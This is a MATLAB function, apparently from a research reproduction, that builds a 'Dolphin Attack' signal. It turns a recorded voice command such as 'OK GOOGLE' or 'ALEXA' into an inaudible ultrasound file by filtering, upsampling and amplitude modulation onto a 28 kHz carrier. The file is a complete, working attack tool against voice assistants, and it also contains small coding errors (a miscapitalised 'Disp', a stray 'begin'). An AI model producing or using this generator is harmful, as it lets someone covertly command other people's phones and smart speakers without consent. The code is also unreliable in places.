function Dolphin(inputFile,outputFile,plotMode,n1,n2,tmax)

%% Dolphin Attack
% Idea is detailed in :
% Inaudible Voice Commands
% Liwei Song, Prateek Mittal liweis@princeton.edu,
% pmittal@princeton.edu Department of Electrical Engineering,
% Princeton University

%% Input Parameters
%inputFile-> The name of the input file to be processed ( make sure that it
%is one channel and has 48KhZ sampling rate)
%n1-> Amplification ratio 1, may need to fine tune by investigating signal
%n2-> Amplification ratio 2, may need to fine tune by investigating signal
%outputFile-> the name of the outputFile(Attack signal)
%plotMode-> set to 1 if you want to see plots to investigate signals
%tmax-> for how many seconds you wanna draw your plots?

if (nargin < 2)
    Disp('Please at least provide your input and outputfile names!!!')
elseif (nargin == 2)   % Default values for n1 and n2
    n1 = 0.5;
    n2 = 0.5;
    plotMode = 0;
    tmax = 5;
end

%% Normal Signal such as 'OK GOOGLE', 'ALEXA'
[Snormal, Fs] = audioread(inputFile);
%[Snormal2, Fs] = audioread('Alexa.m4a');
Snormal = Snormal (:,1);

if ( plotMode == 1)
    subplot 211
    stem(0:300,Snormal(1:301),'filled','markersize',3) % this should be dynamic too!!!!
    grid on
    xlabel 'Sample number:48000',ylabel Original
end

%% Low-Pass Filtering
% Adopt a low-pass filter on the normal signal, with the cut-off frequency
% as 8kHz to remove high frequency components
Fp  = 8e3;       % 8 kHz passband-edge frequency
Fs  = 48e3;       % 48 kHz sampling frequency
Rp  = 0.00057565; % Corresponds to 0.01 dB peak-to-peak ripple
Rst = 1e-4;       % Corresponds to 80 dB stopband attenuation

Fst = 9e3;  % Transition Width = Fst - Fp
numMinOrder = firgr('minorder',[0,Fp/(Fs/2),Fst/(Fs/2),1],[1 1 0 0],...
    [Rp Rst]); % useful function to determine numMinOrder

if(plotMode)
    begin
    fvt = fvtool(numMinOrder,1,'Fs',Fs,'Color','White');
    legend(fvt,'FIR filter. Order = 133')
end

lowpassFIR = dsp.FIRFilter('Numerator',numMinOrder); % Design Low pass Filter
Sfilter = lowpassFIR(Snormal); % Apply low pass filter

%tmax = 5; plot for 5 seconds input to function
Nsamps = tmax*Fs;
t = 1/Fs:1/Fs:tmax;

if ( plotMode == 1)
    %Plot in Time Domain
    %Original
    figure
    plot(t,Snormal(1:Fs*tmax))
    xlabel('Time (s)')
    ylabel('Amplitude (V)')
    title('Original Signal')
    
    %Filtered
    figure
    plot(t,Sfilter(1:Fs*tmax))
    xlabel('Time (s)')
    ylabel('Amplitude (V)')
    title('Filtered Signal')
    
    %Frequency Domain
    
    f = Fs*(0:Nsamps/2-1)/Nsamps;   %Prepare freq data for plot
    
    %Normal
    Snormal_fft = abs(fft(Snormal));
    Snormal_fft = Snormal_fft(1:Nsamps/2);      %Discard Half of Points
    
    figure
    plot(f, Snormal_fft)
    xlabel('Frequency (Hz)')
    ylabel('Amplitude')
    title('Frequency Response of Snormal Signal')
    
    %Filtered
    Sfilter_fft = abs(fft(Sfilter));
    Sfilter_fft = Sfilter_fft(1:Nsamps/2);      %Discard Half of Points
    
    figure
    plot(f, Sfilter_fft)
    xlabel('Frequency (Hz)')
    ylabel('Amplitude')
    title('Frequency Response of Sfilter')
end
%% Upsampling
% Shift the whole spectrum of Sfilter into inaudible frequency range,
% the maximum ultrasound frequency should be no less than 28kHz
% Upsample the Sfilter
% needs to be upsampled to support ultrawave frequency 192
% KhZ fine, for 30kHz + 2KhZ transition =32KhZ frequency support,
% 64K sampling rate needed, 192 KhZ is perfect.

Sup = interp(Sfilter,4);

if ( plotMode == 1)
    figure(1)
    subplot 212
    stem(0:1200,Sup(1:1201),'filled','markersize',3)
    grid on
    xlabel 'Sample number:192000',ylabel Interpolated
end

%Upsampled

Fs_up = Fs * 4;
Nsamps = tmax*Fs_up;
t_up = 1/Fs_up:1/Fs_up:tmax;
f_up = Fs_up*(0:Nsamps/2-1)/Nsamps;   %Prepare freq data for plot

Sup_fft = abs(fft(Sup));
Sup_fft = Sup_fft(1:Nsamps/2);      %Discard Half of Points
if ( plotMode == 1 )
    figure
    plot(f_up, Sup_fft)
    xlabel('Frequency (Hz)')
    ylabel('Amplitude')
    title('Frequency Response of Sup')
end


%% Ultrasound Modulation
% In this step, we need to shift the spectrum of Sup into high frequency
% range to be inaudible. Here, we adopt amplitude modula- tion for spectrum
%shifting. Assuming the carrier frequency is fc , the modulation can be
%expressed as-> Smodu =n1Sup cos(2?fct)
% where n1 is the normalized coefficient. The resulting modulated signal
%contains two sidebands around the carrier frequency, ranging from
%fc - 8kHz to fc + 8kHz.
%Therefore, fc should be at least 28kHz to be inaudible.

%fc = carrier frequency;
%Smodu =n1 * Sup * cos(2*pi*fc);
%n1  %normalized coefficient, input argument to function
fc = 28e3;
fs = Fs * 4;
[Smodu,t_modu] = modulate(Sup,fc,fs,'am');
Smodu = n1 * Smodu;

Smodu_fft = abs(fft(Smodu));
Smodu_fft = Smodu_fft(1:Nsamps/2);      %Discard Half of Points

if( plotMode == 1)
    figure
    plot(f_up, Smodu_fft)
    xlabel('Frequency (Hz)')
    ylabel('Amplitude')
    title('Frequency Response of Smodu')
end

%% Carrier Wave Addition

% Modulating the voice spectrum into inaudible frequency range is not enough,
% they have to be translated back to normal voice fre- quency range at the
% microphone for successful attacks. Without modifying the microphone,
% we can leverage its non-linear phenom- enon to achieve demodulation by
% adding a suitable carrier wave, and the final attack ultrasound can be
% expressed as->
% Sattack =n2(Smodu +cos(2?fct))
% where n2 is used for signal normalization

%n2 %normalized signal coefficient, input to function
Sattack = n2 * ( Smodu + cos(2*pi*fc*t_modu) );

Sattack_fft = abs(fft(Sattack));
Sattack_fft = Sattack_fft(1:Nsamps/2);      %Discard Half of Points

if ( plotMode == 1 )
    figure
    plot(f_up, Sattack_fft)
    xlabel('Frequency (Hz)')
    ylabel('Amplitude')
    title('Frequency Response of Sattack')
end
% filename = 'Alexa.m4a';
% audiowrite(filename,Snormal,Fs)
filename = outputFile;
audiowrite(filename,Sattack,Fs_up)

%sound(Sfilter,Fs,16);
%sound(Sup,Fs_up,16);
%sound(Sattack,Fs_up,16);